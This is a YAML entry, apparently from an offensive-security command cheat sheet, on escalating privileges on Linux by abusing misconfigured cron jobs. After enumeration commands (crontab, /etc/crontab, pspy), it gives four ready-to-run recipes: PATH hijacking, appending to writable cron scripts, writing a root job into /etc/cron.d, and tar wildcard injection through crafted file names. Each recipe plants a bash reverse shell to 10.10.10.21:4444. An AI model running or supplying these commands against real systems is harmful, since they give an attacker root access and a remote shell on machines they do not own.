---
description: |
  Exploit misconfigured cron jobs by hijacking writable scripts, abusing PATH variables, or modifying cron-executed files to escalate privileges.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Find cron jobs
      # ============================================================

      # List current user cron jobs
      crontab -l

      # List root cron jobs (if readable)
      sudo crontab -l

      # View system-wide cron table
      cat /etc/crontab

      # List all cron directories and their contents
      ls -la /etc/cron.*
      ls -la /etc/cron.d/
      ls -la /etc/cron.daily/
      ls -la /etc/cron.hourly/
      ls -la /etc/cron.weekly/
      ls -la /etc/cron.monthly/

      # Check systemd timers (modern alternative to cron)
      systemctl list-timers

      # ============================================================
      # ENUMERATION — Monitor processes without root using pspy
      # ============================================================

      # Transfer pspy to target and run to watch for cron-triggered processes
      # https://github.com/DominicBreuker/pspy
      ./pspy64
      # For 32-bit systems:
      ./pspy32

      # ============================================================
      # EXPLOIT 1: PATH hijack in cron jobs
      # ============================================================

      # If /etc/crontab has: PATH=/home/sec_user:/usr/local/sbin:...
      # And cron runs a command WITHOUT full path (e.g., "backup.sh")
      # Create a malicious version in the first writable PATH directory

      echo '#!/bin/bash' > /home/sec_user/backup.sh
      echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' >> /home/sec_user/backup.sh
      chmod +x /home/sec_user/backup.sh

      # ============================================================
      # EXPLOIT 2: Writable cron script modification
      # ============================================================

      # If the cron script itself is world-writable, inject a reverse shell
      echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' >> /opt/scripts/backup.sh

      # ============================================================
      # EXPLOIT 3: Writable cron directory
      # ============================================================

      # If /etc/cron.d/ or similar is writable, add a new cron job
      echo '* * * * * root bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' > /etc/cron.d/revshell

      # ============================================================
      # EXPLOIT 4: Wildcard injection (tar cron job)
      # ============================================================

      # If cron runs: tar czf /tmp/backup.tar.gz *
      # Create files that become tar command-line arguments
      echo "" > "/path/--checkpoint=1"
      echo "" > "/path/--checkpoint-action=exec=sh shell.sh"

      # Create the payload script
      echo '#!/bin/bash' > /path/shell.sh
      echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' >> /path/shell.sh
      chmod +x /path/shell.sh
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Cron_Abuse
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
  - https://github.com/DominicBreuker/pspy
---
